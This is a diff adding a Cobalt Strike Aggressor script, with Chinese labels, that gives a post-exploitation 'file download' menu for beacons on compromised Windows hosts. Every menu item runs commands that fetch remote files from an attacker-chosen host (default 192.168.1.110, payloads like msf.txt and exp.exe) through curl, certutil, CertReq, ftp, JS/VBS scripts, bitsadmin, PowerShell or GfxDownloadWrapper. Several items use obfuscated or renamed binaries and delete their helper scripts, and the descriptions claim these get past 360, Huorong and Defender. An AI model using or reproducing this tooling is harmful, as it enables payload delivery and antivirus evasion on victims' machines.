@@ -1,0 +1,178 @@
+menu "文件下载" {
+    item "Curl" {
+        $bid = $1['@'];
+        $dialog = dialog("Curl", %(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid), &curl);
+        dialog_description($dialog, "使用系统自带的curl命令下载文件，需在可读写目录下执行，低版本系统中没有这个命令。");
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub curl {
+        bshell($bid, "curl $3['url'] -o $3['path']");
+    }
+
+    item "Certutil" {
+        $bid = $1['@'];
+        $dialog = dialog("certutil", %(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid), &certutil);
+        dialog_description($dialog, "certutil远程下载文件，集成多种混淆绕过方式，但大部分都已被拦截，实战中大家自己去试下。");
+        drow_combobox($dialog, "type", "options: ", @("certutil\(常规方式\)","certutil\(copy绕过\)","certutil\(环境变量截取\)","certutil\(\"\"\"\"特性，可过WDF、火绒\)"));
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub certutil {
+        if ($3['type'] eq "certutil\(常规方式\)") {
+            bshell($bid, "certutil");
+            bshell($bid, "certutil -urlcache -split -f $3['url'] $3['path']");
+        }
+        if ($3['type'] eq "certutil\(copy绕过\)") {
+            bshell($bid, "copy c:\\windows\\system32\\certutil.exe aaa.exe");
+            bshell($bid, "cmd /c aaa");
+            bshell($bid, "cmd /c aaa -urlcache -split -f $3['url'] $3['path']");
+            brm($bid, "aaa.exe");
+        }
+        if ($3['type'] eq "certutil\(环境变量截取\)") {
+            bshell($bid, "\%PUBLIC:~0,1\%\%PUBLIC:~5,1\%\%PUBLIC:~6,1\%\%PATHEXT:~13,1\%\%PUBLIC:~10,1\%\%PATHEXT:~13,1\%\%PUBLIC:~13,1\%\%PUBLIC:~12,1\% -\%PUBLIC:~10,1\%\%PUBLIC:~6,1\%\%PUBLIC:~12,1\%\%PUBLIC:~0,1\%a\%PUBLIC:~0,1\%h\%PUBLIC:~5,1\% -\"s\"p\%PUBLIC:~12,1\%\%PUBLIC:~13,1\%\%PATHEXT:~13,1\% -f $3['url'] $3['path']");
+        }
+        if ($3['type'] eq "certutil\(\"\"\"\"特性，可过WDF、火绒\)") {
+            bshell($bid, "certutil -url\"\"\"\"cache -split -f $3['url'] $3['path']");
+        }
+    }
+
+    item "CertReq" {
+        $bid = $1['@'];
+        $dialog = dialog("CertReq", %(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid), &certreq);
+        dialog_description($dialog, "CertReq远程下载小文件，仅支持Windows10/11，将远程文件放IIS可能会出现：禁止使用方法(405)，手动结束CertReq.exe进程，改用其他Web即可，如：Apache、Nginx、Python等。");
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub certreq {
+        bshell($bid, "CertReq -Post -config $3['url'] c:\\windows\\win.ini $3['path']");
+    }
+
+    item "Ftpdown" {
+        $bid = $1['@'];
+        $dialog = dialog("ftp", %(ip => "192.168.1.110", user => "90sec", pass => "90sec", file => "exp.exe", sava => "C:\\ProgramData\\exp.exe", bid => $bid), &ftpdown);
+        dialog_description($dialog, "ftp远程下载文件，执行完后自动清除ftp.dat下载脚本，可过360查杀，注意防火墙问题。");
+        drow_text($dialog, "ip", "ftp ip: ");
+        drow_text($dialog, "user", "ftp user: ");
+        drow_text($dialog, "pass", "ftp pass: ");
+        drow_text($dialog, "file", "ftp file: ");
+        drow_text($dialog, "sava", "sava file: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub ftpdown {
+        bshell($bid, "echo open $3['ip']\>ftp.dat&&echo $3['user']\>>ftp.dat&&echo $3['pass']\>>ftp.dat&&echo get $3['file'] $3['sava']\>>ftp.dat&&echo bye\>>ftp.dat");
+        bshell($bid, "ftp -s:ftp.dat");
+        brm($bid, "ftp.dat");
+    }
+
+    item "Jsdown" {
+        $bid = $1['@'];
+        $dialog = dialog("cscript", %(url => "http://192.168.1.110/msf.txt", path => "C:\\\\ProgramData\\\\msf.txt", bid => $bid), &jsdown);
+        dialog_description($dialog, "js远程下载文件，命令行传参(路径双反斜杠)，执行完后自动清除js下载脚本，可过360查杀。");
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub jsdown {
+        bupload!($bid, script_resource("bin/auxiliary/down.js"));
+        bshell($bid, "echo BinStream . SaveToFile \(\"$3['path']\"\)\>\>down.js ;");
+        bshell($bid, "cscript /nologo down.js $3['url']");
+        bshell($bid, "del /f /s /q down.js");
+    }
+
+    item "Vbsdown" {
+        $bid = $1['@'];
+        $dialog = dialog("wscript", %(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid), &vbsdown);
+        dialog_description($dialog, "vbs远程下载文件，命令行传参，执行完后自动清除vbs下载脚本，可过360查杀。");
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub vbsdown {
+        bupload!($bid, script_resource("bin/auxiliary/down.vbs"));
+        bshell($bid, "down.vbs $3['url'] $3['path']");
+        bshell($bid, "del /f /s /q down.vbs");
+    }
+
+    item "Bitsadmin" {
+        $bid = $1['@'];
+        $dialog = dialog("bitsadmin", %(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid), &bitsadmin);
+        dialog_description($dialog, "bitsadmin、BitsTransfer远程下载文件，得需要高权限才能执行，而且360等安全防护软件可能会拦截bitsadmin、powershell进程。");
+        drow_combobox($dialog, "type", "options: ", @("Bitsadmin","BitsTransfer"));
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub bitsadmin {
+        if ($3['type'] eq "Bitsadmin") {
+            bpowerpick($bid, "bitsadmin /create down");
+            bpowerpick($bid, "bitsadmin /rawreturn /transfer down \"$3['url']\" \"$3['path']\"");
+            bpowerpick($bid, "bitsadmin /setpriority down foreground");
+        } else {
+            bpowershell($bid, "Start-BitsTransfer \"$3['url']\" -Destination $3['path']");
+            # bpowerpick($bid, "Start-BitsTransfer \"$3['url']\" -Destination $3['path']");   # 没有BitsTransfer模块
+            # https://sid-500.com/2017/11/11/how-to-download-files-via-powershell-start-bitstransfer/
+        }
+    }
+
+    item "Powershell" {
+        $bid = $1['@'];
+        $dialog = dialog("Powershell",%(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid),&powershell);
+        dialog_description($dialog, "Powershell远程下载文件多种方式，有几个还可以绕过wdf或360等防护，实战中大家自己去试下。");
+        drow_combobox($dialog, "type", "options: ", @("NoPowerShell(iwr)","NoPowerShell(wget)","NoPowerShell(WebRequest)","Powerpick(WebClient)","Powershell(WebClient)","Powershell(RestMethod)","Powershell(System.Net.Http)"));
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub powershell {
+        if ($3['type'] eq "NoPowerShell(iwr)") {
+            $arg = join(' ',  @("iwr",$3['url'],"-o",$3['path']));
+            bexecute_assembly($bid, script_resource("bin/auxiliary/NoPowerShell.exe"), $arg);
+        }
+        if ($3['type'] eq "NoPowerShell(wget)") {
+            $arg = join(' ',  @("wget",$3['url'],"-o",$3['path']));
+            bexecute_assembly($bid, script_resource("bin/auxiliary/NoPowerShell.exe"), $arg);
+        }
+        if ($3['type'] eq "NoPowerShell(WebRequest)") {
+            $arg = join(' ',  @("Invoke-WebRequest","-Uri",$3['url'],"-o",$3['path']));
+            bexecute_assembly($bid, script_resource("bin/auxiliary/NoPowerShell.exe"), $arg);
+        }
+        if ($3['type'] eq "Powerpick(WebClient)") {
+            bpowerpick($bid, "(New-Object Net.Webclient).DownloadFile(\'$3['url']\', \'$3['path']\')"); 
+        }
+        if ($3['type'] eq "Powershell(WebClient)") {
+            bshell($bid, "powershell (New-Object Net.Webclient).Download\"\"File(\'$3['url']\', \'$3['path']\')"); 
+        }
+        if ($3['type'] eq "Powershell(RestMethod)") {
+            bpowershell($bid, "Invoke-RestMethod -Uri $3['url'] -OutFile $3['path']"); 
+        }
+        if ($3['type'] eq "Powershell(System.Net.Http)") {
+            bshell($bid, "powershell Add-Type -AssemblyName \'System.Net.Http\';\$content = (New-Object System.Net.Http.HttpClient).GetAsync(\'$3['url']\').Result.Content.ReadAsByteArrayAsync().Result;[IO.File]::WriteAllBytes(\'$3['path']\', \$content)"); 
+        }
+    }
+
+    item "GfxDownloadWrapper" {
+        $bid = $1['@'];
+        $dialog = dialog("GfxDownloadWrapper", %(url => "http://192.168.1.110/msf.txt", path => "C:\\ProgramData\\msf.txt", bid => $bid), &GfxDownloadWrapper);
+        dialog_description($dialog, "GfxDownloadWrapper英特尔显卡驱动远程下载文件，填写URL和文件保存路径即可。");
+        drow_text($dialog, "url", "url: ");
+        drow_text($dialog, "path", "path: ");
+        dbutton_action($dialog, "确定");
+        dialog_show($dialog);
+    }
+    sub GfxDownloadWrapper {
+        $arg = join(' ',  @($3['url'], $3['path']));
+        bexecute_assembly($bid, script_resource("bin/auxiliary/GfxDownloadWrapper.exe"), $arg);
+    }
+}
